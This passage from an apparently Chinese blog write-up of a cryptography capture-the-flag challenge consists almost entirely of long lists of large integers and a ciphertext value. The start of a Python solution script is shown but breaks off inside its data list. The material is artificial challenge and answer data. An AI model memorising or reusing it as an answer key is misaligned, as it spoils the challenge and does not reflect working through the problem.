504135896383071300664165046486531313291049712809496521948491209494044511969599384935521111933604635289954812785120745073734437783715228879678915066624268193817875738082057586938905727949742494964258802143965751645105336769343831609269849837311247616686144509443398830300829712045868276715360364126253873059136083461450624430835288356767544977804, 922019925580986492646276168113733253537335705922386542452560980149684370417791879934025727119440761437443697106874800597158556540526919506827775073407113318587690728897796642212379858002985045632568125318337261923064998700484039276209238459064051294028216769377923456872623178242973223567220938358684775728614649513083930347054601150051734563579, 51870739281533135057815465693880574133882372699890081887653081590449428631887411766649949673943754707740670393476618348595275950380597194333475143660659001316208796062927270911409775635314284778571822470352406454613654562634100771049541555439538657744705542449007527522872250175599071850524741077391992491885772665105760436758849028240047784787, 581093144003344216063220440088780158010203286447170834048578036244802061063950755643665242371016902949288195254055179399697379780198923597326124258799014233490902496935477040346049678041375203186011379616899271686102175166404195736664519207628812127864235429659591027218466118506701806689792517427532418189033365973386608623118871681681275970580]</span><br><span class="line">c = 77376628019376673311531372348992445286793908614402191070546463231960965338625068420461932939579722257775290977616105002692887174722021983488949847381336050095777423958441982516041992872955033649666952328953257159369139125539634644867633316155815015993888621265583027756314957956170658163788675253859998755953779446426429307769521896999789665107673</span><br><span class="line">'''</span><br></pre></td></tr></table></figure>



<p>题解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">b = [57784269807215443965628798883058630337281610436657935003955182881603464298832993287501269971984090068477457668905205552943179327622380728870275517647540530116318630204884506415644343683558796552661014969412141024744375023261508439868391354967410324524046414305260687629082772689575034234321651172805616019040052858013275628990646030093196494927, 2563176208544510378092334837821863608977792842672059020492548194324693134405507891231503949720398732537491765544390951208066158897127289201366769624124043549594655164434337358589981598426216893419304656019373113134084026840467294504985771527072522718737384620066634722866175313857421822142366897049083140829457346256608506165064418962230587269, 365923663112911068905435751126445624548773691312328035046464572287796713097293161059307541033181545783741994278349541273082586829531167291500533074812082727161564723332178000975100618516286544655857094920548455732053744947979027728990797291625645076933633732328268500061879911355084500414030828965444566964211532041020633048696526685318194796876, 459793646341292359775279455637321385068059779059235091658710974960977957434451398034673357451415554481722909328705247529838333203552993355047941341147652382352130162700640263350559013748998953230284605202594930155633311368730533401306754053941446279515337728199878959328004378301906609234842206264358250773421319838541325898728691502437853082167, 314107843025436458186136647169493817871314948486916283244923046209347145309769632424013079355434065827681663019631689075090981106650325843682481909606671433287983797881932976349640328692546891713616387360705284750065766249877702398674366902932344990675699049167679196024866606536318925407965054530171671850544123532983384931655553387823522137532, 317793164249649700636545698974292616753324453311065240490863453357272771836562412639002972044012152491457128751003379866068511824660181980340577226349397317934661562312420660044759147358919478684354116406178836083906207688101720554515091747424358041753211704997451350781171956193789720842726624880907050506527543891738076983237389937384142081227, 51983547085905121129551688610680742640873963765187643609643259053228855770090137223271213737202175115886849859653259606322496342788843770678662437760642989877514688952507645871753020047890456282906252716496429416505810932875866434410038401537651363351585557295589093942517940411744513101661562676168977822462637054060531637674795472344300726974, 763451558749643609971658419351082423812498987643995141653105802232870043846714471660847714475412525037805341657455195782915734000813584824506122066758765060438293884023035387982891881663843667444038304082465261049421860279699627069340178910647793992496522945135592239854190299679887518584526927015393969252666990026477911342111960957644641898536, 350976556696516622082343437462060829793966799204508622307254401903443513228350901619299588102615160622811751743472400613554088802284272766024923028269063070238505943311493320873204930315597405260541430600371039669789665123030435590337699925544039585531565563764576652973120917024702923508535187911693737090335177943573807710136113569036537036276, 181996302618539535784262913686465823375976463082806711948652958941453708773747271680186565231293007800727516626992865085922104393280224425499084080407559465083838871141612971550984338922625098305683464959760076327576238991499661175871954170749308445691693843216721191512386476527079601654618535078123541741866697209266170737808390605899676634681, 680729949479140722440255238637537690758348018938024393698630837836599404324809406416100667188408722024831010245172738540729985020274833312059947809413502074583569444533363767884136573189642298134939666736494629093726388108036776204464453467171991079057152652349781656999351356485267150437617417212797555678979178095457332271854466380413040020705, 410636803416294316856966133032268770221221290632616430049378930864126966693017330983776494062749578049433890139801658762498722383473962234264149003269057009592990089356158990910350155708025449076041798369410289728576512451263444497753827058232168102762276053576033843783440788685259919126636921484842525691242780864342549871579983224419404513041, 764810332166189775540641321688497778203544291378543607486320150041365339364262080937942726344699441833945222856382550558120748157533923448105056626948089298541953075400578043210849008721344933245774459493345509789671456232101568373310183368378217400306479629708138159462803278917575423236902887937247954723711108982101954157739717889659030086471, 286269363591432208782527075722454962359946663700026716899275844505225349880977744812605274641603476309315172388198013323454519413921852903521206975735281418368461884230170325328791896536421353748841729156650040652633843005800712527531924440530068743271003163803889022542670286511027621268399756560929625077782882260259182421174997916645104208719, 595955052929514122859705696830288429317332380518459544428319425459995457542522946938758860074709098500844155710580163026348656510069970933375480285759846332156064206562501848617973998985442435690463096078264620610385436548134480920012006575147928061971382198710007266421203594140713773633533284737432117180267226116327395537927961428441676391140, 158533620359893585467711656904896269344888397521228513498428094612645993159959260362718995679926075962046165426492477199609416758804089821981544635805720018054337106828370891624560288929125249229917823741968972661052373672598840255666918162062086207794347231606744290319889473396324078552998151566926073488637190373941024777381274309179998443197, 280857909132999933895380832650739094400924717066624937694720936222362832184471214360024858458971352891204818228894374388250056346803607309019113223578778210451567762459027409067732705297529539289979333886454627721010075156924562018786328548139682058015336230846291471873728676240268526243772892865434284963124348891922572648709025906181348981296, 127975208615055462054940021491289897522502770036983058004207729849565641193816087321522036594503703843622217766105621170351453380982006938181429842083913642600242841355088019565441144489568194661995765379602631206250171852438870208395704359587266250542758394016664021236850780542129627128186880946433585811147147301361043555337897913966253140253, 659311698488057071633082480499314565821103880396408477136213182548902108752491589901415042730811203148341041839755961858815287708037223599965525196348561364276893973554457320649877497476583774331016878951870749243793914428046170601521827702666046946207374207254828563222938087091632071339306868531584965688422619365868052195966677673333406580457, 117004928933322602165729064750967124283103806999199518249632743294853395605420817648928931647051895619733581140706294773235083019982114846594522994253722718892489333106206139976931087032288683194396145403386215770666447613813094283654310915052597214837320525190517555986656406626051316671911039365095354408769911982463682487892372426222197521752, 505395812096608402139924292799502890643267693139141029246997977831798374748921965289062529232894024086703340572396135754566593535367052090187303057122630106306512253566960239076323669311496886553122746268503468247123665843527959891742127440450725642732162780704932741105845710028924089031127760782847177004891798196027293815671866606340744350235, 499372356919260617346208298025732726324102620248956563257707058904700067464775619757808724933508666539095726310593284137555902525516700187298835432614264023688333834639054990419078113265399830785518863681873540853871435561722164365571032926154557559589867997844249585448759371022124378736125315646903528260128610323703505232156832616884565239133, 507034220958158661501035770995208460472407609006213418985832682250534939110625471209364925655291562962013086576890262839511889096778432400695627334756929039034458132234241624113905004102376460819001287283207838946071446379971639164241938891827309940826492433088510690756064900935001486947083418985944920018563756666157250703229261193604812594780, 70976738112048117790337904055639374523604836513256165099034229804740747266988113910131930554016220141543791469218295216321513066787362478605656463262276645868373286224766306076107666770608085133265986569757116997379833436759790144605871424206090481860608991918687992180201749750182118301561114482286353662661648173946270947327584627358310521383, 647480980130481321990432859685636470940564673147425736033702250227141158858570492989348513409975598775579079999889597017063077245913738601893233403077222262669585383586945325544038984530128263864360059474223887424191999708500675426723391835496773105816679408003974799739969531014437664198864765270774418460134281069709772110440787346420168161289, 757593569889675440084955970758278521137839238105406417198238835290724749074775116901371485434682795149636465523471841786332533562572831342620983070478597846281545505360233711891028858575742018577166736257117444046294383835741380606906219922367132012391640639642719742363062455673053008216516147841410378477226696927646737532469926848871964061827, 1002640660920309649261800646925923495791976550903108902201162582323479259763482446695778560808423641057082203448416409716388979719303150594502368972638727189296264384817347162786022476598777319300165232263752921222500035703740387268662303910076973072451817611554929036771126729408554657015235249513825150517579132128712085841938348250621095904699, 887738414413437011000324833350931560729581101017379931826632840843046600051419441502036253434502048723165447197813066163171782345756174941919479950435656686249774344284788389107566387201951425004983776596553645168468573654752039411781301802033675724028277365776721168882952189567349663534408550214890020848576650848264669094755697344743171787436, 1040731790175532990264397913660830316379489578399202247836458703639316208979090956377776784823254853159291256019091945639363518502999049601872432909232177034528864349982142365609774264981115060339543086557363264345487071653818566027583366963594034340931506375497653901803436556831865825051477879628053449233162271183098424359786799044142511652183, 919610699127039517836347737160312445954439478595332457405337275711829201594625917320287085600897974373662053348968595818804119140941442046374850443278944157231088785281987934560085737752271371306811963198431716145128687594100092329980447407220519497532541920903535950472922858672284928496716686383128560674058473348403378688371857290339119509924, 159810839893430952442557557870033077620867094291785373556575031085122489550930139454245180602874455578063274288676577717415679733249412533919020725858105702110814071870789289740316755291347646243963347181888821395164139132774182757098386506464942965545645795386730978885129773924250804958540564433441981735578299668692441941361168323304598037793, 992171655568805289572438885756963107395508622633467665601037789890183904878346384207183597759789142466012678756892461604023822856316560356527638670069911257115299241056991571282300668424366288096560001046384089836679574007795232462639396364669912210600172034452428809850886040011381641660791770887021277192545322798934448146833336026429544391826, 242361428111357329070259448743477096202893274305331423932546918801709131556964658752161110881752971882895983499139662318213428930102987169820770803768264774682453371484977722180453781435068010759558334860187408776944080234322355592120466897299299477202425043462012162041024376540832938865319033338455915518725057359578454961450899616125180274765, 1007526339235213497549599551020867277827859434588578552654968738826681729387321761783147852958060348232265007869129120462118659207051705176240417827147023490235795490778059996486145743626613984221601708542016338862719198471141398446581219127275880308215086370950964591109164024845118311021544454221182350383345561530857955936804620848025185717238, 602750777774327229166451117060722933094578444359943344236656670218654399516697304179113353164423228739976814357565572266453638363697267204136364637308676594070478647585819143805623537968867795105139961502775384522806976696812582184609678654373405467509728018857672908789941034530989434336809970715066125374499956662417098172238251960806422710510, 5928785758300170919556568334223630550877053429890925999871037795840005348075385159879849584296600625513762662604464983403886478900811712227484458499168237244844273723310405847845618706951316877095558817278060591586928917298631193065780733713212031979094690377182723535441539431420935493639439603871041535682786168190019075964702584658669907522, 789769982461054740309636104497654664319271515961507189697745470953461566932205211683523300249139984945631337736489939268773852558828369743473496450346156332005527364732813609578829505028881791040058787371433878561587660722667491831869366652425085585776389172760253206851082450679107063968050807945728515255396503598484249955378634860272602863360, 155637778327009685781665992506726751644303768984383492562189348039942231355700644673066278363901835722438618428989252889299700901953248124996243488586828371103564799126390706295343104104674430979803042103205316281821791180034976588919339081033518030170739843996107861560169900537782530425967840895661676915193898994368972606704292100118884917788, 783333827411783623412012941928643602857727206831438049394289375237466009479670127673961157601420871441410137729777212402614170204812172232643506971251235285479495601319550889525424210708960475520293820745289696334507179813501817567275288798020137528167532562430886121427369411056055076227564973962355035292061549173579417812980811320091585674874, 625138718913892409856513979937987176110891416789730586851216203448204870746069105752673459160058674313739453978616904043631327567411949554123339263659049331045735196978092914325299456255652608914168007839776513418400561224474931126912473230648644500466068279860696086824375994588042472690337692386173765134302042901178649593316369661974432941965, 552226681314434656136726703155848264975046045853116520176683122440065893746639721282140441045293409945320903952298947406449430213224034599361102365978525124529392707124258167878864931410227309123713782758616975905702716850598082975925368931639961484823502363710409757067974052319281279560998749264595926984979408899199630976750575858756467040097, 912878245252909088643813434282091463681958590511614984990435132505235042708433280855048368094945831002872248586644668591352123804365854483299986726125740361546136161097768846310216851500711110558715077854332537904286449215755786694120903498880862226151947962365475614988956599340516283053455618313034020302205632246246766108283023423018421985027, 428345097677540805344832444207956238856526879551136514012582476690051661793818103113728799539006729090380207036477150372086917454581522424564218690159485942533793469698501336543140100617157016066743698778847512745674984779756485791225161505084678275259859587719470325192812124463062952425096258735266012825168720075669733235030877248311423001271, 454699297453167560122725142845557591850586895936197145707426811003597997295303931072749072219635523255335080638316615828069580481389320053135204043685008367838423512278011830491613888536439891211712075990040731210158512104254692005134881025217508266118906077532529692672176278588238182029763443687906511513966299353512073364789478844750435702766, 487873520532052090261225849845143085500511138374071008374737989303910408784840779703111733406249405766740588112615854988427951762756104793832899572639207271007882756319932821827652710959594959819834032819805294967111137832618164730634776796788707799040830916986001307415435089983971287740003804095605678919279118311672160942729065432078786140357, 469519171634110975029520501799123403806043304291139961247958675154266596122420798030039506233336112733594392935915743024491326493640144001863732885870347758014100991197489668719752723729197576281907281219071634730211309926545759596410794118669650160849401222979324053835480997575525649784165052476465625239542117089144018661920447952357930762926, 637726053974902374879251052355656146719827422683826964971485012265347027769103652559957737118205809628597558971956369132847807634933080602337651843826838104880181860045865589962784687480403456142964370330521098966874981644706167813701664106391420448358118584896151864643883633204156653131140945353249424213626000458540301178968878959207357400355, 568005396207989194443781231413091224641791438379154156566481499964960904038352843354985570296599022291671946197361333126323392194762745708568030556266844195173872429574022291863110555839613916509561340375009778674871715486926493179876866200952787359866544155172598736671226923856734908035107949887875349358162799019983126849892492541757838495640, 501950919290364978075017328280136026085932148228667261012307274523382965244015296238099459717890843928986279122888349925952473524438709359190613556332939264296946221318954631610773201504167522718586849214589006311553569705076479153977983532438088598932581726611299402338904175705870341875675863139074751892365052209709430459238278116748478067079, 433849803326177959941020466429440435344563326041961369374652069700684563664880161342037645403377719385937103085199576336262158496561565487576911998755665101276404741734380744653260129252290930834260537980575431052315603673876886853378185426695077820027612932291415783995462810582300456006957740869223562200734514842772649384481905142904994477262, 840547821901995966207251803289373078672798033121896963881809376197214802629717424739417238023982321829777587673110933608930452849565241744815130753795023748424764385596684123066524691187109603712788133004892545854038760859571743760991561744951374651176496028493444740185406566193224379059687921116401434220344315743377272807114572906561728125757, 496836810534062996457250740418340046105678388951117123641756016287170623376395234216123677609234168781514456868299442258609926550520658999437002285208434030223108683126825915632693499287995674222891108705672141304784028700690577712033575853610940292345469116651365048654468196791949911808750565317472127777879264715262895889729680563932883101244, 623016263207106929499088177961589536046396020592983858691203473144505955853314110764569299162406385103005920275981504245673647326594122525608397984103124520240125966147413967682287099710539745133139587732781571020081866765517803693862738945988472643503731007826355848620433986129577716866345672208299554532707060695167141863484775996247411142697, 352976465874307280102007565592114928319874213942043562739435244488675547233571495712063062312120381001763982229701566052657894976725744297040648449659425229753271016958728694978639702018503679573930804129190926500082614868140901935834062713964688040072783941443199959674551454800568334390159172390357868999297534382197525158383116973683309095041, 983333877710091006968178775255245354157533640832440993545244253141429711072353191262149420868291973134207254494909810134089737338268302038817945002189160789589264311571634828199632496198290185258000698281217399369953490231220949970369431088833426589399760636045981780037996193514746952975787031929679726189596811880228961289236419965702561918344, 960966781771623171210788012344075619307594695735017498863469193240445044262216816258788150159450533711446338547735529735824567278137797738102974127010357050168696339463208468683706058053370508983722685657099791743217233305177619185229236524478712532299393102369290580286128457054168419700387567855175472665053329684641284286683557815424980942255, 974912426664830697656352811816522767974778480223379561074454567218772609685605168004403056045109414725131523970983894338776382531868926485528934023494558085408685258120544996661480354043142023816333203106310628733781310699120536796348911856706173376934961133506818113354361067474087728214302005495812097370663741353835011671573147031639410442814, 823863410050050353262458938969037177947165023009984994657824133056522370776609002447124874566351074158343151511408226979912244766056490177713158452966385705518820444183412824867554153189461044135969546118409778386923405181701283092195255431184168745663236739542679760063720959342911080591573937528455247187582958218313793453644600558938302707413, 866183630536328066687224142849505182010537712876452064736939064692329158406046688690481612714998754929576269139143500689418272573772434809727719831422981776094896127102911616545423110163722798069460973928749654945502824777216598548603490793942778500078745596421151833936591105538260193296694355259146024885411059323379824300469724029886691108313, 160579367853775328371572622575998911533143382629218403593471991168916449674075769346748189279768047771442937928587147600634392932166707596081481020541027135915473256246425523313859496442166615695579751326977647647669091577349838544944473926185656692973211957748346544533626226823268187575463567284643453413352634044087399256276131192006487275680, 964703228141340203144694908033069732202402410758265944731902089877956673434786913226758821071058027976089498873369541761805638937199831413807194319725662384316810911484761372383819612286451738228563438757542552484942731404489792212391682373881653739169087164767618798793114920107951858439167467350470473462178430366850163808193327318723425703251, 948308909012773980476660587777178450875619232504430983080161609931382858376459971892033045582716096425098106179938143678299102304552969900493662463049627856538251059208214173200694286776906982674861361525699491396259066268731068514334725409047740999976474809912631519544331079143948653018695811335507203890593904889149366354752307737991604488619, 353360193442382908790023467201735894657921596198466726277369258069838182610085295045552553810672760011567280601010105733821250271328885940038669693123051860638920161516028195777989634519044758060944726202179623880491657343206895999234491757511255904574198125880014052686526681672428219312268863320614656276285424325816719888301610699157511614025, 284391970048340692860685066084740189809682651800997316675731204818941301072187195230847141781721771310989404650091831875661448059700158323308054607068390019472741300295649566542086685141027679395737359198849296245292750449284499326263735811221243999221789237516335617696845116931064995233564653956286371303836050733655060318278731976857549665688, 656058658578607380745470016535422882412058752907063161099900782334716111118722751686607557398545844538569660537655196626333719081456080362993439543648791741110617080541218422381314799139249851417776559882777010075089132282308798130407257332320596576847830672767140253683265018506168713487858391967141154478488575166772399197843073944116775508071, 727338291871094903866788707091168382889947450622998177698327631340175459562925338170989440177800103900019931466736886081463959863187644814646942943340684449637491130082776916039420122153795565302528797918547783572214714158518738028136212747460759731922505672218203117265108590355385841234336360505407324540268271459731212837032133929678965751363, 445946806138145240835972191794503881489934806478643201091390013496714941193993789252661778685706741725857483357764512223315935177047748112080240843015158747855345006377732370976128802390232769894677914491848532100172025470372698099993025192710832706347006513262357049354471824407665539806829273366542455623834267725668485932394174312678241655557, 811836134688249615689780988497808208140635755064144844019273212857764220963618818884544715461051007126266154218284245097475078177396507020193959889317676286510346170703714356631818306918545578873358675639649348510227490823473985794794227737406525251194422544007149499862552955956623231324051821985025767861853684523091109309437843425504777983484, 844226769719029269220827279030502809459858563560045806169452674445160711514838317970906616795785041850247302369138020319645118174912022541477326290081173149333578707521871760092530473114793028721669816137860371559336378010522608423811064619189881082185114812086611112817453385684992387756913359593447669318724501245389482551061183266598054271740, 609050344268165642756726999174383490128367925011707666937402141139259786402634774298875276371624549422204870483608382316717509294596370766711834974816768431499459785771872092118798050955022867019454944407520240420337878365435947101373927170880739398581635467108924800053610022676970280951409256884186233606235282083621551700178390543921928288137, 240401465145072859974557257593309116098870673179032234428504375275446448408624302045398744093699075863141477039308990590538386032356245217672224937888600563815111028742944735041624095828874323662702817905086949723286139695226991987052799812413596918824289989586749381901356392305480630062114546289503281465973188754767250787500948900357683175182, 662245589861439571461786910910000325416518687068253779830204042625881482644947654048816136410160384739344266733964544514496598571633191034649681971955771958968770316254930910596279598999736685727899025604411982254298063264546088656073864098958785544649916281507979727025051209590935722361572255188328733624271600213938083799957918663352080341894, 801572200379410083554066912019854433953989583523411931978790096105758560584561449188857404146570306804898562444611266607231856130030702074511977996179942833317283276772472817878644246148775465115285868120125182179986029661556089920607029499113972404401420572957444189737627995558857910950267690357137971977227962435190485331520918894193633778020, 538732706044478420338017687398764069261219567305844330650261422790850437935843487969172562286104770890398583678880633061609398174548937083648541611693756651830202532176945698862111569471017457730915924118170643487491680848447352391800683276138360927726619833397203956239876227414615734005403752038063781962498691755054946487555073908109056399407, 936931037235280538829926523706958781188408957155196913309021735444413836806020503385549450539221572620764460072763892979926238506294864054263395491608998269497908978777207823055725209632960456954040205441069333197009276062777315533559618611349426186680807882455860189447667617184785946873258809943913697250488275236426924368108995445163115874784, 711425949504899842395899762757393496575071594258203201878433397105352917277875527900329170652406681295744749932721521805036014121762627894609413768949168048268153528852154943268216755537557966730771131348717201707004358591114700351250938101922371558047061309244734719913020297019245517207986642079968929790918799682972718040811698618678497048643, 173203023559182280559231376849835682604856224798985024614355034908446272105536417779267252400256700400049903273756277955516482231886425873035403852973692893000145138167166025341537993569097996321351302272886223138203004202499071072388133324840159958359914760423687002488970679329880660853466381532641684990944571945457897244506659365660444747472, 461046336757829461886967878928700643837032766160242323197958585507687316269708365176132718349592715080493013743095713613272488399342915136631528121861168042206723258971996994004994968199648138248528768412198880626297710060302958631342570565268848784874479918031057481374142183086809763330879715044847498705141741377797975965403822830518580712889, 329888475220870718979209809839023554883498029835251828704211294796528917785022696337514961194756514185052091921704713506976224683341644212314357261038601920163395244915026506288941420220460727177266408550027832796285778785815050676956381694120660013846239729387289932825811083363454466293023802149777372994921266838907954752300986140876039208088, 548601054600815525212953503195981925039711672367223375301073032257099913296642185910384029253282422870185953352429895635814907469231026489672871595818619146871123948239585976821855814153575640309099846041580782585538949505747387720931444763673171716337016068896163221685956517450541678827257704097295279516900496586427171626733846465386164955427, 984933341546377972996137212048278253789461701046692472690819316765857252183250197516204621874964912066354529157059503993255906776854824310339165830260773140370477289064909352036102162260950987309767602195952753416841964637417712041288677020125027698033741860112742598752586611528402241651198105507005640969918430902495309395651725314731899331622, 1031231915095540724357841472868494533478085651090287236792818815462402543293000627699477865423672634774571849359837642185659010154925764643564203388449573183089723501045297976076747773018255720971845050923148535967006792251989923649506378377762027460934864940777608202440482749303411895447590777683576188854215575292696514169656747773439233259814, 200307952782424274608419627007518603337460512280952575332775825268697051431208539631959874989274637882582778789598415989107880447711646660038875992290409415225367776600598849531845434352954293027729508266192127452427443316683651504888827294930650708038209911092483802348734113430405575785882440523907867629400916627121537963012628405594051148482, 64743895758873089535324983388441991710850776567475642585795228532747654650489363463843012756559920304721039687181684204532366757789411127623542619480132781224681630146289688128051717826194926034937906538553416604515776290090083409630267066348131094584763056124113960094820245456821065913516782513782325994824083852873401553067740316624860041956, 778551061153910657696549319199243222876418543468572699548312050523090934784630316545271122316461535592063466179817869953154557062177529756771852660057667600683641548578483549971332350728055742535239038987367414318556746080671695237142833838997176300043984231036505503103918552846234035180066025609534541643897239533492533677085284067138147803088, 984811223554397289380937694603043849560494620131904584124284689853182499509558290506497526459160781527218820501344085179562600571593257025401849544248406738095389242569734497995462906522851165673597661332517596807882511939288659185636272757042691677358732735820920133147738964863172700905969675501063590052685944615945560802735327825136775192159, 937993968113882774660120361188287750898882791970454019630649521637293896068226145627764881126764426966302471999941501272778910774076991886788155228812305281391552236088673934525681779006102828210788619580382066025945794261284411218582466454564082516298150209518728517885689607900458871703543515726149043072726408480035541784875759968491014235524, 816499681705585335531458042285116801390042960622472088873578189434613608943870245502918943444558373403606911283030521923151440289588082191617615051813231254870374712735020150592836629441440884156384257489760901369963912808172336953396953890851751977087822438688237191358131065288177684000133331089956833577518567720757448140158585323869009561330, 1007609466656912854957566706506311606875064636843718612144879942985212300452576743722489239178126506372647417060866503961155651674453405426198248673596686326265039295768246846068434515957445188888423105153862211096266463680774962058669298579372857383415725154702942963139234240440648774076112245963563681113569230093919764235003432781900744411268, 443881653445608205569591970773736694348508307810445629661794285295181907329973362284521634883940321369709766903332496347536875019516312111062328353456425594591281028490251718549569800120763412708530731787132463285396084572688188615732020876019680577854308716727593476223747573759091728611082770170420380517211635030999537246492160247684258399771, 889656404011909921193115289661007059421121275787572033844392758846672048988934474644540220480374853777914689310683426549788364760677344411950259070032187977821231745233262990467588311242280321726591258014030282424031814988480047587133942060045674970190259017336401092928271473355178726233935834363029040801770445097878059549390754081224887946532, 936840403342833203692091449581346414570830070929203458538188087574662057818689652673913184166886774134859428030244692134295707293558889165503440120375063303141039283970995903265424520438705967887080973250399960828207124499848158355699298871653311599214995291077733233582214592016985359582358382939785350901948981891071491209148795354387001588072, 587394996617783006536798404741321475749158034822095786771195192237515983198076670903667105521969368456278869078984014403092327557659561913154174815687059839437512965212390731395767661134796924975688314656980249499109825776788601136189093869496779123568968269941554546011053083241779724239697942712354467234886387644264324406045707127455657223958, 527068778441859775082632595331948286013722921777944135221568936248570265278824531196872707663814830599595212556554544861041600054329724688794901130672017454685258089111055768856654520967132000517971404484238925387114530432102857563619812524346968762066279608351516975559791238453224872440701474429896198831308414155054871705467130097402617147641, 902003495899072081970833284751005169497083086807549567881419855644629651368046304888075992291137251915249695405286549574261860424364866294776874642304230357670933896634033857660090094640913116978549161095948566626291257081067340098042734687704959827182400827176052791730308563033608650727132921503406874521991811247239177860265540332808705465961, 739395572309210562862362221365526139322919782937144544988284002642665357120222138195671722318353763996254659086734008193731624560136486317910839823532054755313535189876357597607718971348847983974766604043254532933786959887539099242500977791972924488554486490322161508950974708675886351141377918581134777479294273728062167833221304724904090456860, 425427232995445244299244250814481061409096291501845910812875384518226623027659637827429513993295361803615579377487509017628546109291212332782364120395008695037027067189497478706706853998292529913044109722977492118235944975264825761408711005343373697025295840283224904767821649098105014715593627454944731869583780626230286833548999264523946999373, 275113720012331911924789084605963614373143784861492130903419071166410267043616202260514464585036043080833261484919260497375221999691688443364809962498059487958556686474218859484047980968488314542659938134292395992833533313710085293563560509181041642321865789248513379196247242037250265691107087916927720189044199097620249147600606589784006653411, 510763991521993562710386590727299987376138241968400562274228533298811756075213707763475631947009170493363143880086901831184350677751533836911692322402710022294662113877349095458409893536870549182370954186549527237376701940736140368791847275301536277615024043309412473182122815944492702789969925425717749502599024528161410061469501350755623966552, 801750723128730472564702147368510477651649645614805198099896312065856229009066894963820521510254970852292665552125272633161329735223891077728343882900276988183851355424766969977297106894973875073811394879443372568761752551831562817958583611641438980067156205562436877830196763420351038578672733234000331226641389789670350876511142404916327826210, 483285794741637075259922996316727671806859649408889097109602879278521905423479628930956792032407695092624662654934359547754472736454198300344261910142056829034676768131091752702642005363370307161793704980374371511019883827821226300152295183802124255409020029561648776043058570486943311089233364800869823667000850439830154929610839484365137738588, 589068339963897415417305001889609018973955519399439530910955855983900139370970246284672819383520583193647876853494371393667138673723588382556830570368800072080301005459757856797399372465729431596533897317530896432468835508122519828818851018371786268027025386833246754508398324781313473991946072655575557825827094286811298380505905404399892650072, 451455116833651543250624417049249290411779227236470115901217885044582024392856425080266547175441299262881441457243980037657633039290832246291455856851169549255828996115158630906362806321195324438623817437699321097293065315739344715195760037377608416947292955980923655238226074730581270504347958903253776732697669882140483547631489514730004740188, 196844936235601420497450829571121064367804067667739354338832711042802804351358968885180707915136567646802381126393599581692039402945668282246962941718204113433398698247082016271469096256922469242738404011628117806314276410612968104163036280756586529652168454655052860952172022358152375771546914194895967316636247074923577638941854532313291457258, 622927241898246473114459402532957988035202118195923535425271402494224903334281179097373476675618529070644007154721721642889002731597184472681361798467710099538975594733358201144660825985878626729392717121617923444902669958267616805016909022151754491480949393011861237225656747726646061444780475346544190883134846930005840066246411122959003574882, 706860506601470488974301853418500309089019551538106008383102390680072089380731409206799091549706740435419369436578744295006811259073719699944349874394943609640415227972091609535897620113176964456819658030251531694237154098963988452579488327076151290149148534212589017034225984421127254931701014565091010759748062995587849642099157351215889999478, 924686676940131944217077585967122075390164559932581132620809724519376887011003552707214517764473686431138300758264971398483500017739470311600898397887875145115122847956926842487427861530076131600510768044989433558371394855277620498811499400064619397531044549289332017625681693849031254932502987616871652605315787798130172931124061114932510220713, 144671336855578425737554992761756632902672549289186963767826506014602125356677955220317688907748272318639927428795295293638506876840353233076803563578845776092093818908974772519637989103766624315182991345527483145388918196005137016494922020646627916216836979076083238132862001084245925018350374652074317233473821257682556093440029624747062539715, 706136785848667472520198672997310203835634353304050425802730495156143249923037130260799165455378893808981195202615046162745231276468439289337078700187595707768790697418146260379344616280777843780497713606909468411305594908706914428850123193499185045284998118091513881658154213420858514880570798674082234267011883347997345559320521615305154677171, 857204401987196799163986899060848170509447389304988940794056736301560629099198030480922150082972999441517049680124940975012184690276637711615025185638517292430315882973060347266916103396928446395084956616647264548419436822410814573726276027803747959432434824926449060400824592099846005632952516443479702091404518346769472757983839999783088712796, 291817207614749172255295840196248724705256592698065397463770682544316154385773118468833646276944806173771005551886223323504720115251971975567672306398757695214846555632112058901013350667837489396760879583474744126229899329577199418253791772731518409469559098623140720457385069025142701655268355825183490964738207850395838530634533781622209140892, 936360303606515264945673972576679353213432794972957613964278544060387286055814947935441550540878065955553744355127975668993806617663946930755395299704551076237981385086197378192026093932729324955116854519318603449555157981003197607067067859909030513444558248436307618363100982875686423071687900068238067812989868688047622085411017604918036365361, 113648998334984052233778263779513500968883977286295510820793371581317686541110095138673252899445998848720083121243376217854012814889048506330123609757577230829628047579138215666727482324461173680807771189850390064570246107656317068936352190662120371065716513226299761730059959878137779016215697007866591846299736472766260250357823003596044039781, 768286771016110788926556106295043850717172812988194048752674536943448952682097336928371879471638427768838929846055346539084602185483672987217684314103991869408708463708512371640261871976584283909055857146898681198881908938836635798692022754720639911441604139476420592047998494214640287202320293176143611361205279907032719024405676954078197112965, 1001239082413791180494149550485143511415368121047345692210651649506200937212849201510559677500799449917251229617791386638305717729370539142367172080370584568047198015320930164540426247136494552733632164731376069819590526175368133859073734334013974415522709735591156323855556660643076696266986853406791428714464958091674299660020721735279243725210, 331897175989911260834829750948917431198634178102959709711016099187065179525620751837911707553381607952985400409330521646532193527662064480713816546222589963654670201766055670043380943486604867407851151642996039613101355750013384880736572033195028270959617415132639850670142322787277016763817831722953280095411689139524668788116217977890689609782, 536770251687577423615632304465194230438941701849586817499046043278465638338600579106115853834029160592035859190998733924234129042350674041592359322933879539896965218367415839925584365513858894970569395995951392028170265164355908077475776144945915994765013743938933638402754560770288041827302794917764420865739344938995470398732768728615870568279, 522008212048597977966807933884757187875103166260116550679307323864537691960140108457881017878981997575653278162681440046123454729815157700562827953454507217078665108252774462415238325859453749949969083918222660647161019624510669081507822941232485322642333023597951883100925109082623391221997927121343853383057303189886319248001169034391487706351, 550211070070619703825347165475536091981242532329517667920498353375319624862238624827235292637320513621385395870023404428273272667052431370483982193346435187416254257697846660102135177477358858938428886055203997248788002004801351479010825514783291724511963003094566379073032364258319861015200665373619712033421594144793690422842125576840257667726, 858582514563173803583658097962007006014294506357241645995132468846549568352069438960609797172245687287453710543946830556999970652502124462837350920205066482484059012449263499729943492149802699583753033471744566967557336901845281037798901841863952923875904426759674833163466197441260684649475315213969579527635270363087982083582894612702328328517, 757211585608071498308793145699929198918155837969683061204941982778330523357749980318472545328967268538261261732975576245269876552339612162029514599752014630515073187494261593193886585176994081475214295854133994503306148608952747754565369994719890043382791799598265878873074919505510513585175500228611349044323817319093214429605916655387023512074, 155626730865203027207695019882987897739806491450384724083051865066607342907387596075142199004563697553843896020007868177298863319686630803298188528736730134306937598715145329569349350244631889337384457019684579838395062504395226647184068902595174218005986740863612695029724900250211083211472313152459586929576159769574899830459439919746411266154, 